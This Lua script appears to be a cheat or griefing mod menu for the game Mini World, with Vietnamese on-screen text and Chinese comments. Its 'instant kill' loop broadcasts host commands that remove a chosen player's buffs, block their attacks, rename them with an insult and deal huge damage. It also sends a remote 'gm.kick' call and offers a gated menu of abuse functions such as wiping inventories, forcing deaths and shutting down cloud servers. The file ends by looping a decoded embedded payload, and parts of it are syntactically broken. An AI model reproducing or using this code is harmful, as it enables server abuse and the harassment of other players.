GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                

                
                -- ===== 添加禁止攻击状态 =====
                
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì (mục tiêu đã bị cấm tấn công)")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        local disableAttack = {
                    [1] = "player",
                    [2] = "forceOpenBoxUI",
                    [3] = {targetUin,797}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "setnickname",
                    [3] = {targetUin,'#RChó'}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin,[=[mob_3407]=]}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack1 = {
                    [1] = "player",
                    [2] = "setActionAttrState",
                    [3] = {targetUin,32,false}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)
                   
                end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {targetUin}  -- 清除目标的所有buff
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效
                        local t1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                        end)
                        
                        local t10 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                        end)
                        

                        

                        
                        -- 设置属性（可选）
                        local t2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                        end)
                        local t3 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                        end)
                        
                        -- 造成伤害
                        local t4 = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {myUin, targetUin, 1.8e+308, 0}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                        end)
                        
                        
                        
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffĐã tấn công " .. loopCount .. " lần")
                        end
                        
                        threadpool:wait(0.000000000000000000000000000000000000000000000000000001)  -- 0.1秒攻击一次
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}  -- true = 恢复攻击
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end)
            end
            -- ====================
        end
    end
)
end
	
--------------------------   
    
    
    
    
    
    
    

function AccChangeColorBtn_OnClick()
    local currentDevice = GetClientInfo():getDeviceID()
    
    -- 检查设备是否在白名单中
    if not deviceWhitelist[currentDevice] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho VIP", 3)
        return
    end
    
    ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            AccountManager.cluster.buddysvr.routemore('gm.kick',target,54188)
            ShowGameTipsWithoutFilter("#RĐá người chơi từ xa", 3)  -- 这条提示会刷屏，建议移到外面
        
    end, "Nhập Mini ID")
end

    
    function TaskTrackFrame_OnClick()
        local texta = { "Chức năng tùy chỉnh" }
        
        local commonFuncs = {
            {
                { "Cấm vào phòng", jzjr },
                { "Trình mô phỏng phá bản đồ", ztmn },
                { "Chỉnh máu nhân vật", rwgx },
                { "Thay đổi bầu trời", gbtk },
                { "Không thể tấn công", wfgj },
                { "Tạo thuốc nổ", czzy },
                { "Chỉ định dịch chuyển lúc hoàng hôn", zdcsrl },
				{ "Pháp chú Đại Phật", dffz },
                { "Chỉ định người chơi đi theo", wjgr },
                { "Hút cả nhóm", qtxr },
                { "Đặt điểm", szfs },
                { "Vương miện trên đầu", tdwg },
                { "Lặp xóa vật phẩm rơi", qcwp2 },
                { "Tạo BOSS", czgw },
                { "Phá khối", phfk },
                { "Tăng tốc nhân vật", rwjs },
                { "Xóa sạch túi đồ người chơi", qkwjbb },
                { "Buộc người chơi bò xuống", zdzl },
                { "Đổi thời tiết (nắng)", gbtq1 },
                { "Đổi thời tiết (sấm)", gbtq2 },
                { "Đổi thời tiết (tuyết)", gbtq3 },
                { "Đổi thời tiết (cát)", gbtq4 },
                { "Trọng lực bản đồ", dtzl },
                { "Cấm tấn công", jzgj },
                { "Mô phỏng phát ngôn", fzbr },
                { "Ngăn dịch chuyển", ycbr },
                { "Ngăn treo", fzbk },
                { "Tạo trứng nổ", czbbd },
                { "Động tác chờ", djdz },
                { "Nhận toàn bộ skin", hdqp },
                { "Hiệu ứng độc quyền", zstx },
                { "Danh sách đen phòng", fjhmd }
            },
            {
                { "Kích thước người chơi", wjdx },
                { "Sinh lực người chơi", wjsm },
                { "Chỉ định bay", zdfx },
                { "Sức tấn công người chơi", wjgjl },
                { "Người chơi thất bại", wjsb },
                { "Chỉ định rung camera", ddjt },
                { "Hiệu ứng người chơi", wjtx },
                { "Người chơi tử vong", jbwj },
                { "Hồi sinh hư không", fhxk },
                { "Cấm di chuyển", jzyd },
                { "Tắt quyền", gbqx },
                { "Xoay người chơi", wjxz },
                { "Giam giữ người chơi", tjbf },
                { "Xóa người chơi", qcwj },
                { "Cảnh cáo người chơi", jgwj },
                { "Chỉ định buff", zdbf }
            },
            {
                { "Lấy vật phẩm máy chủ đám mây", bbqw },
                { "Tắt mô phỏng phát ngôn", gbmf },
                { "Bảy mươi hai phép biến hóa", qseb },
                { "Dịch chuyển tức thời", sjyd },
                { "Phát ngôn màu", csfy },
                { "Chỉ định người chơi ném vật phẩm", dtms },
                { "Tạo 78", czjb },
                { "Kích thước tùy chỉnh", zddx },
                { "Thời gian trôi", sjls },
                { "Triệu hồi thú cưng", zhcw },
                { "Triệu hồi thú cưỡi", zhzq },
                { "Skin vũ khí", wqpf },
                { "Tạo nhà tù", czjy },
                { "Chỉ định theo dõi", zdgz },
                { "Chế độ trước trận", jqms },
                { "Chỉ định nhấc người", zdjr },
                { "Điều khiển di chuyển", kzyd },
                { "Người chơi tự gây sát thương", wjzc },
                { "Cấm chat người chơi", jywj },
                { "Thú cưỡi nhanh", kjzq },
                { "Xóa buff", qcbf },
                { "Cày huy chương", sqxz },
                { "Thần uy giáng xuống", tjsw },
                { "Phát hiệu ứng âm thanh", bfyx },
                { "Bắn laser", fsjg },
                { "Lưu điểm hồi sinh người chơi", bcfhd },
                { "Cấp skin cho người chơi", gypf },
                { "Đổi đội", qhdw },
                { "Skin tùy chỉnh", zdpf },
                { "Khóa thời gian", sdsj },
                { "Vẽ người chơi", hzwj },
                { "Sinh vật tùy chỉnh", zdsw },
                 { "Tạo biển hoa", czhh },
                { "Chỉ định thêm bạn", zdhy },
                { "Khối dưới chân", jxfk },
                { "Cưỡi lên người chơi", qxwj },
                { "Đóng máy chủ đám mây", yfgb },
                { "Ném cả nhóm vào hư không", qtxk },
                { "Tâm ngắm phá khối", zxph }, 
                { "Tâm ngắm điều khiển người chơi", zxkz },
                { "Tâm ngắm cấp hiệu ứng", zxsw },
                { "Khu vực đấu đơn", dtly },
                { "Sửa tên màu", xgcm },  
                { "Ảnh đại diện tùy chỉnh", zdtx },
                { "Xóa vật phẩm rơi", qcwp },
                { "Tâm ngắm tạo dung nham", zxyj },
                { "Văn bản màn hình tùy chỉnh", pmwz } ,                        
                { "Bật quyền", kqqx },
                { "Bỏ qua cấm chat", wsjy },
                { "Chỉ định người chơi hạ gục tại tâm ngắm", wjzxms },
                { "Bỏ cấm vật phẩm cầm tay", jjsc },
                { "Miễn chỉnh sửa sáng tạo", mczbj },
                { "Tăng cường sinh vật tại tâm ngắm", jqsw },
                { "Chuyển sang khu vực Nhật Bản", qhrb }, 
                { "Chặn giao diện tử vong", pbsw }                       
            },
            {
                { "Cảm ơn bạn đã từng ghé qua", bf1 },
                { "Giới thiệu cá nhân", bf2 },
                { "Ta vốn gửi lòng theo trăng sáng", bf3 },
                { "Hành khúc cách mạng", bf4 },
                { "Vẫn sẽ nhớ bạn", bf5 },
                { "Rashomon", bf6 },
                { "Dành cho bạn", bf7 },
                { "Đạo sĩ Lao Sơn", bf8 },
                { "Càng lúc càng không hiểu", bf9 },
                { "Bài hát loa kép", bf10 }
            }
        }
        


local a = GetClientInfo():getDeviceID()
-- 将当前设备码作为键放入设备函数表
local accountFunctions = {
    [a] = commonFuncs
}

        
        local function getDeviceID()
            local clientInfo = GetClientInfo()
            if not clientInfo then
                MessageBox(4, "Không thể lấy thông tin máy khách")
                return nil
            end
            local deviceID = clientInfo:getDeviceID()
            if deviceID then deviceID = deviceID:gsub("^%s+", ""):gsub("%s+$", "") end
            return (deviceID and deviceID ~= "") and deviceID or nil
        end
        
        local function getAuthorizedFunctions()
            local deviceID = getDeviceID()
            if not deviceID then
                MessageBox(4, "Không thể lấy mã thiết bị")
                return nil
            end
            
            local funcList = accountFunctions[deviceID]
            if not funcList then
                MessageBox(4, "Thiết bị này chưa được cấp quyền")
                return nil
            end
            return funcList
        end
        
        local authorizedFuncs = getAuthorizedFunctions()
        if authorizedFuncs then Functions(texta, authorizedFuncs) end
    end
end

-- ==================== os_load函数 ====================
function os_load(ft, msgis, msgno)
    if gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/1') then
        load_msg(msgis)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/1')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    elseif gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/0') then
        load_msg(msgno)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/0')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    end
end

-- ==================== os_load调用 ====================
os_load("rwdx",   [===[ rwdx() ]===],   [===[ rwdx() ]===])
os_load("rwtx",   [===[ rwtx() ]===],   [===[ rwtx() ]===])
os_load("rwjs",   [===[ rwjs_speed() ]===], [===[ rwjs_speed() ]===])
os_load("zhjqr",  [===[ zhjqr() ]===],  [===[ zhjqr() ]===])
os_load("zdjqr",  [===[ zdjqr() ]===],  [===[ zdjqr() ]===])
os_load("zdkr",   [===[ zdkr() ]===],   [===[ zdkr() ]===])
os_load("tjzd",   [===[ tjzd() ]===],   [===[ tjzd() ]===])
os_load("jjzd",   [===[ jjzd() ]===],   [===[ jjzd() ]===])
os_load("gbfj",   [===[ gbfj() ]===],   [===[ gbfj() ]===])
os_load("gbtq",   [===[ gbtq() ]===],   [===[ gbtq() ]===])
os_load("cggj",   [===[ cggj() ]===],   [===[ cggj() ]===])
os_load("qzhy",   [===[ qzhy() ]===],   [===[ qzhy() ]===])
os_load("sqfw",   [===[ sqfw() ]===],   [===[ sqfw() ]===])
os_load("qswj",   [===[ qswj() ]===],   [===[ qswj() ]===])
os_load("ggmx",   [===[ ggmx() ]===],   [===[ ggmx() ]===])
os_load("wqfm",   [===[ wqfm() ]===],   [===[ wqfm() ]===])
os_load("Fxms",   [===[ Fxms(true) ]===], [===[ Fxms(false) ]===])
os_load("ydfh",   [===[ ydfh_all_1=true ydfh_all(0) ]===], [===[ ydfh_all_1=false ]===])
os_load("wdtz",   [===[ wdtz_all_1=true wdtz_all(0) ]===], [===[ wdtz_all_1=false ]===])
os_load("load_lua", [===[ lua_load_OnClick() ]===], [===[ lua_load_OnClick() ]===])
os_load("jdfk",   [===[ jdfk_all_1=true jdfk_all(0) ]===], [===[ jdfk_all_1=false ]===])
end
    while true do
        threadpool:wait(0.1)
        pcall(run_embedded_decoded)
    end				
end)